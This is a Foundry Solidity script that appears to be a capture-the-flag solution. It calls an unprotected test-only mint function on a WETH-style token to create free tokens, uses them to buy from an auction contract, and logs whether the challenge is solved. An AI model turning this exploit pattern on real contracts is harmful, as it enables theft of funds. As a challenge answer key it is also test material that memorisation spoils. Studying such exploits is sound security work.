// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Challenge} from "src/Challenge.sol";

import {IAuction} from "src/interfaces/IAuction.sol";
import {IWETH} from "src/interfaces/IWETH.sol";
import {IERC721Extended} from "snekmate/test/tokens/interfaces/IERC721Extended.sol";

contract Solution is Script {
    Challenge public challengeInstance =
        Challenge(payable(0xb73740ABdC3A714a607939872f3d526864FE06d4));

    function run() external {
        vm.startBroadcast();
        address user = challengeInstance.user();
        address auction = address(challengeInstance.auction());
        address art = address(challengeInstance.art());

        IAuction auctionInstance = IAuction(auction);
        address token = address(auctionInstance.token());
        IWETH tokenInstance = IWETH(token);
        IERC721Extended artInstance = IERC721Extended(art);
        console.log("price before: ", auctionInstance.getPrice());
        tokenInstance._mint_for_testing(user, 1 ether);
        tokenInstance._mint_for_testing(msg.sender, 1 ether);
        tokenInstance.approve(auction, 1 ether);
        auctionInstance.buy();
        console.log("price after: ", auctionInstance.getPrice());
        console.log("auction balance", artInstance.balanceOf(auction));
        console.log("user balance", artInstance.balanceOf(user));
        console.log("solved?", challengeInstance.isSolved());
        vm.stopBroadcast();
    }
}
